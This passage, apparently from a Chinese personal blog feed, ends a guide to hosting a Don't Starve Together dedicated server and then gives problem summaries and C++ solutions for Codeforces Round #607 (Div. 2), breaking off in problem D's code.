title="(3). 找到存档"></a>(3). 找到存档</h2><ul><li>打开DST，选择创建游戏，选好需要使用的mods，然后选择创建。<img src="2_3_1.jpg" alt="avatar"></li><li><p>然后返回，选择数据按钮，选择对应的存档，需要注意的是，他的排序是按照顺序的，即排第一个存档显示的就是第一个Cluster_1。<img src="2_3_2.png" alt="avatar"></p></li><li><p>然后选择你的存档，复制到上一个文件夹，并且在该文件夹中新建一个 cluster_token.txt  (原本就有的不用新建)</p></li></ul><h2 id="4-寻找服务器令牌"><a href="#4-寻找服务器令牌" class="headerlink" title="(4). 寻找服务器令牌"></a>(4). 寻找服务器令牌</h2><ul><li><ol><li><p>点击游戏界面账号按钮 ,就会有一个界面</p><p><img src="2_4_1.jpg" alt="avatar" style="zoom:50%;" /></p></li><li><p>点击页面的上方的游戏按钮，</p></li><li><p>点击饥荒联机版的游戏服务器，添加服务器，名称随意。</p><p><img src="2_4_2.png" alt="avatar" style="zoom:50%;" /></p></li><li><p>将令牌复制，并保存到步骤(3)中的 cluster_token.txt 中。<img src="2_4_3.png" alt="avatar" style="zoom:50%;" /></p></li></ol></li></ul><h2 id="5-启动快捷方式"><a href="#5-启动快捷方式" class="headerlink" title="(5). 启动快捷方式"></a>(5). 启动快捷方式</h2><ol><li><p>在DSTS文件夹中，打开  /bin/scripts ，复制一份其中的bat文件，然后更改其中的代码。</p><p><img src="2_5_1.png" alt="avatar"></p><p>将红框中的代码改成</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-cluster</span> 你的存档名 <span class="token parameter variable">-shard</span> Master<span class="token parameter variable">-cluster</span> 你的存档名 <span class="token parameter variable">-shard</span> Caves</code></pre><pre><code>2. 然后打开bat，完成创建服务器。</code></pre></li></ol><h2 id="6-开始"><a href="#6-开始" class="headerlink" title="(6).  开始"></a>(6).  开始</h2><p>​        打开游戏，浏览游戏，选择你的游戏，加入！</p><h1 id="3-遇到的问题"><a href="#3-遇到的问题" class="headerlink" title="3. 遇到的问题"></a>3. 遇到的问题</h1><h2 id="1-联机mod失效"><a href="#1-联机mod失效" class="headerlink" title="(1). 联机mod失效"></a>(1). 联机mod失效</h2><p>​        我在server_log.txt 中 ，发现了</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: <span class="token punctuation">[</span>Warning<span class="token punctuation">]</span> Could not confirm port <span class="token number">10999</span> is <span class="token function">open</span> <span class="token keyword">in</span> the firewall. <span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: <span class="token punctuation">[</span>Shard<span class="token punctuation">]</span> Shard server mode disabled by configuration <span class="token function">file</span><span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-378160973<span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-684098549<span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-553665029<span class="token punctuation">[</span>00:00:20<span class="token punctuation">]</span>: Could not load mod_config_data/modconfiguration_workshop-786556008</code></pre><p>​        大概率是端口冲突，打开之前复制的存档位置，打开master 文件夹，打开server.ini 文件，更改server_port 的数值即可。</p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round #607 (Div. 2)</title>
      <link href="/2020/01/03/Codeforces-Round-607-Div-2/"/>
      <url>/2020/01/03/Codeforces-Round-607-Div-2/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h3 id="A-Suffix-Three"><a href="#A-Suffix-Three" class="headerlink" title="A. Suffix Three"></a><a href="https://codeforces.com/contest/1281/problem/A">A. Suffix Three</a></h3><ul><li>题意：<br>给定一个字符串，结尾有标识符，让你输出其类型。</li><li>题解&amp;代码：<br>直接按照题意模拟即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">vi</span> <span class="token expression">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> t<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        string s<span class="token punctuation">;</span>        cin <span class="token operator">>></span> s<span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'p'</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'d'</span> <span class="token operator">||</span> s<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'m'</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            ans <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"FILIPINO"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"JAPANESE"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"KOREAN"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="B-Azamon-Web-Services"><a href="#B-Azamon-Web-Services" class="headerlink" title="B. Azamon Web Services"></a><a href="https://codeforces.com/contest/1281/problem/B">B. Azamon Web Services</a></h3><ul><li>题意：<br>给定两个字符串A，B，问最多交换1次A中的两个字符，然后使得A的字典序大于B的字典序，若能则输出A的字符。</li><li>题解&amp;代码：<br>贪心求解。假设$s<em>{pos}$ 是A中的一个字符，只要使得下标$pos$最小，选择$s</em>{pos}$ 以后的最小的字典序的字符，并且交换即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> t<span class="token punctuation">;</span>string s1<span class="token punctuation">,</span> s2<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> pos<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> vec<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> s1 <span class="token operator">>></span> s2<span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> s1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> s1<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">></span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>                vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pos<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> len <span class="token operator">=</span> vec<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pos<span class="token punctuation">;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s1<span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s1 <span class="token operator">&lt;</span> s2<span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> s1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"---"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="C-Cut-and-Paste"><a href="#C-Cut-and-Paste" class="headerlink" title="C. Cut and Paste"></a><a href="https://codeforces.com/contest/1281/problem/C">C. Cut and Paste</a></h3><ul><li><p>题意：<br>给定一个数$n$ 和一段由 $1,2,3$ 组成的字符串$s$ 。给定一个数$l=0$ ，进行如下操作:</p><p>1、$l++$</p><p>2、将$s<em>{l}$ 右边的（包括$s_l$ 本身）复制$s</em>{l}-1$ 次，并添加到字符串$s$ 的末端。</p><p>3、重复操作1，直到$l=n$ </p></li><li><p>题解&amp;代码：<br>模拟+数学。因为数据范围$n&lt;10^6$ ,所以考虑分数据范围写法，先按照题目要求将字符串$s$ 的长度增长到大于$n$ 的长度，之后使用数学公式即可完成。（我发现我自己的代码写的太菜了，题解的代码写的非常简洁QAQ，STL大法好）</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">vi</span> <span class="token expression">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token keyword">const</span> ll mod <span class="token operator">=</span> <span class="token number">1e9</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> t<span class="token punctuation">,</span> len<span class="token punctuation">,</span> i<span class="token punctuation">;</span>ll ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out", "w", stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> t<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        string s<span class="token punctuation">;</span>        cin <span class="token operator">>></span> n <span class="token operator">>></span> s<span class="token punctuation">;</span>        ans <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> <span class="token function">_s</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> tmp <span class="token operator">=</span> _s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'1'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>_s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>n<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                vector <span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span> <span class="token function">sub</span><span class="token punctuation">(</span>_s<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> _s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> tmp<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                    _s<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>_s<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sub<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sub<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">//  cout &lt;&lt; _s &lt;&lt; endl;</span>            <span class="token punctuation">&#125;</span>            ans <span class="token operator">=</span> <span class="token punctuation">(</span>ans <span class="token operator">+</span> tmp <span class="token operator">*</span> <span class="token punctuation">(</span>ans <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>ans<span class="token operator">+</span>mod<span class="token punctuation">)</span><span class="token operator">%</span>mod <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="D-Beingawesomeism"><a href="#D-Beingawesomeism" class="headerlink" title="D. Beingawesomeism"></a><a href="https://codeforces.com/contest/1281/problem/D">D. Beingawesomeism</a></h3><ul><li>题意：<br>给定一个行数为$r$ ，列数为$c$ 的由A和P组成的矩阵。可以进行多次操作。即选择一段连续的元素，一个方向，将该方向的所有元素都变成该段元素的复制。问最少进行多少次变化，可以使得该矩阵所有元素均为A。</li><li>题解&amp;代码：<br>仔细分析一下，发现最多只需要四次操作即可。分类讨论即可。</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">int</span> r<span class="token punctuation">,</span> c<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span>grid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">col</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">row</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> c<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'A'</span><span class="token punctuation">)</span>                    row<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">,</span> col<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">,</span> tot<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tot<span class="token operator">==</span>r<span class="token operator">*</span>c<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tot<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>c <span class="token operator">||</span> row<span class="token punctuation">[</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>c <span class="token operator">||</span> col<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>r <span class="token operator">||</span> col<span class="token punctuation">[</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>r<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>row<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>row<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>c <span class="token operator">||</span>         <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>col<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>col<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>r <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span> <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span> <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span> <span class="token operator">||</span>        grid<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token char">'A'</span>         <span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">||</span> row<span class="token punctuation">[</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">||</span> col<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span> <span class="token operator">||</span> col<span class="token punctuation">[</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out", "w", stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token 